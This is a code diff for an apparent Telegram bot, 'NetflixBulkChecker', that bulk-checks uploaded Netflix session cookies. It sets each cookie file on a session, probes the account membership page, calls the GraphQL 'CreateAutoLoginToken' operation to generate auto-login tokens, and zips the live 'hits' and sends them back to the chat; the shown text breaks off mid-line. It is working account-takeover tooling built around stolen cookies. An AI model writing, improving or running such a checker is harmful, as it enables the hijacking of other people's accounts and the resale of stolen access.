@@ -1,6 +1,5 @@
 import requests
 import re
-import json
 import time
 import os
 import threading
@@ -47,41 +46,17 @@ class NetflixBulkChecker:
             return
         try:
             url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
-            data = {
-                'chat_id': self.telegram_chat_id,
-                'text': message,
-                'parse_mode': 'HTML',
-                'disable_web_page_preview': True
-            }
+            data = {'chat_id': self.telegram_chat_id, 'text': message, 'parse_mode': 'HTML', 'disable_web_page_preview': True}
             requests.post(url, data=data, timeout=10)
         except:
             pass
     
     def get_country_flag(self, country_code):
-        flags = {
-            'US': '🇺🇸', 'GB': '🇬🇧', 'DE': '🇩🇪', 'FR': '🇫🇷', 'ES': '🇪🇸',
-            'IT': '🇮🇹', 'TR': '🇹🇷', 'BR': '🇧🇷', 'JP': '🇯🇵', 'KR': '🇰🇷',
-            'IN': '🇮🇳', 'CA': '🇨🇦', 'AU': '🇦🇺', 'MX': '🇲🇽', 'NL': '🇳🇱',
-            'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱',
-            'RU': '🇷🇺', 'AR': '🇦🇷', 'CL': '🇨🇱', 'CO': '🇨🇴', 'PE': '🇵🇪',
-            'AE': '🇦🇪', 'SA': '🇸🇦', 'EG': '🇪🇬', 'ZA': '🇿🇦', 'ID': '🇮🇩',
-            'MY': '🇲🇾', 'SG': '🇸🇬', 'TH': '🇹🇭', 'VN': '🇻🇳', 'PH': '🇵🇭'
-        }
+        flags = {'US': '🇺🇸', 'GB': '🇬🇧', 'DE': '🇩🇪', 'FR': '🇫🇷', 'ES': '🇪🇸', 'IT': '🇮🇹', 'TR': '🇹🇷', 'BR': '🇧🇷', 'JP': '🇯🇵', 'KR': '🇰🇷', 'IN': '🇮🇳', 'CA': '🇨🇦', 'AU': '🇦🇺', 'MX': '🇲🇽', 'NL': '🇳🇱', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱', 'RU': '🇷🇺', 'AR': '🇦🇷', 'CL': '🇨🇱', 'CO': '🇨🇴', 'PE': '🇵🇪', 'AE': '🇦🇪', 'SA': '🇸🇦', 'EG': '🇪🇬', 'ZA': '🇿🇦', 'ID': '🇮🇩', 'MY': '🇲🇾', 'SG': '🇸🇬', 'TH': '🇹🇭', 'VN': '🇻🇳', 'PH': '🇵🇭'}
         return flags.get(country_code.upper(), '🌍')
     
     def get_country_name(self, country_code):
-        names = {
-            'US': 'United States', 'GB': 'United Kingdom', 'DE': 'Germany',
-            'FR': 'France', 'ES': 'Spain', 'IT': 'Italy', 'TR': 'Turkey',
-            'BR': 'Brazil', 'JP': 'Japan', 'KR': 'South Korea', 'IN': 'India',
-            'CA': 'Canada', 'AU': 'Australia', 'MX': 'Mexico', 'NL': 'Netherlands',
-            'SE': 'Sweden', 'NO': 'Norway', 'DK': 'Denmark', 'FI': 'Finland',
-            'PL': 'Poland', 'RU': 'Russia', 'AR': 'Argentina', 'CL': 'Chile',
-            'CO': 'Colombia', 'PE': 'Peru', 'AE': 'United Arab Emirates',
-            'SA': 'Saudi Arabia', 'EG': 'Egypt', 'ZA': 'South Africa',
-            'ID': 'Indonesia', 'MY': 'Malaysia', 'SG': 'Singapore',
-            'TH': 'Thailand', 'VN': 'Vietnam', 'PH': 'Philippines'
-        }
+        names = {'US': 'United States', 'GB': 'United Kingdom', 'DE': 'Germany', 'FR': 'France', 'ES': 'Spain', 'IT': 'Italy', 'TR': 'Turkey', 'BR': 'Brazil', 'JP': 'Japan', 'KR': 'South Korea', 'IN': 'India', 'CA': 'Canada', 'AU': 'Australia', 'MX': 'Mexico', 'NL': 'Netherlands', 'SE': 'Sweden', 'NO': 'Norway', 'DK': 'Denmark', 'FI': 'Finland', 'PL': 'Poland', 'RU': 'Russia', 'AR': 'Argentina', 'CL': 'Chile', 'CO': 'Colombia', 'PE': 'Peru', 'AE': 'United Arab Emirates', 'SA': 'Saudi Arabia', 'EG': 'Egypt', 'ZA': 'South Africa', 'ID': 'Indonesia', 'MY': 'Malaysia', 'SG': 'Singapore', 'TH': 'Thailand', 'VN': 'Vietnam', 'PH': 'Philippines'}
         return names.get(country_code.upper(), country_code)
     
     def parse_netscape_cookie(self, cookie_text):
@@ -122,29 +97,11 @@ class NetflixBulkChecker:
             for name, value in cookies_dict.items():
                 session.cookies.set(name, value, domain='.netflix.com', path='/')
             
-            payload = {
-                "operationName": "CreateAutoLoginToken",
-                "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
-                "extensions": {
-                    "persistedQuery": {
-                        "version": 102,
-                        "id": "76e97129-f4b5-41a0-a73c-12e674896849"
-                    }
-                }
-            }
+            payload = {"operationName": "CreateAutoLoginToken", "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"}, "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}}
             
-            headers = {
-                'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13)',
-                'Accept': 'application/json',
-                'Content-Type': 'application/json'
-            }
+            headers = {'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13)', 'Accept': 'application/json', 'Content-Type': 'application/json'}
             
-            response = session.post(
-                'https://android13.prod.ftl.netflix.com/graphql',
-                headers=headers,
-                json=payload,
-                timeout=15
-            )
+            response = session.post('https://android13.prod.ftl.netflix.com/graphql', headers=headers, json=payload, timeout=15)
             
             if response.status_code == 200:
                 data = response.json()
@@ -156,11 +113,7 @@ class NetflixBulkChecker:
     
     def check_cookie(self, cookie_text, source_name):
         session = requests.Session()
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Pragma': 'no-cache',
-            'Accept': '*/*'
-        }
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Pragma': 'no-cache', 'Accept': '*/*'}
         
         try:
             cookies = self.parse_netscape_cookie(cookie_text)
@@ -171,12 +124,7 @@ class NetflixBulkChecker:
             for name, value in cookies.items():
                 session.cookies.set(name, value, domain='.netflix.com', path='/')
 
-            response = session.get(
-                'https://www.netflix.com/account/membership',
-                headers=headers,
-                timeout=20,
-                allow_redirects=True
-            )
+            response = session.get('https://www.netflix.com/account/membership', headers=headers, timeout=20, allow_redirects=True)
             
             if 'login' in response.url.lower():
                 return None
@@ -454,9 +402,22 @@ def handle_document(message):
             with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                 zip_ref.extractall(extract_dir)
 
-            checker = NetflixBulkChecker(
-                telegram_token=BOT_TOKEN,
-                telegram_chat_id=str(message.chat.id),
-                threads=10
-            )
-     
+            checker = NetflixBulkChecker(telegram_token=BOT_TOKEN, telegram_chat_id=str(message.chat.id), threads=10)
+            checker.start(extract_dir)
+
+            if os.path.exists("hits") and os.listdir("hits"):
+                hits_zip = os.path.join(temp_dir, "hits.zip")
+                with zipfile.ZipFile(hits_zip, 'w') as z:
+                    for root, _, files in os.walk("hits"):
+                        for file in files:
+                            z.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), "hits"))
+                
+                with open(hits_zip, 'rb') as f:
+                    bot.send_document(message.chat.id, f, caption="🎉 All hits saved!\nHere is your hits.zip")
+                
+                shutil.rmtree("hits", ignore_errors=True)
+            else:
+                bot.reply_to(message, "❌ No hits found.")
+
+    except Exception as e:
+        bot.reply_to(me
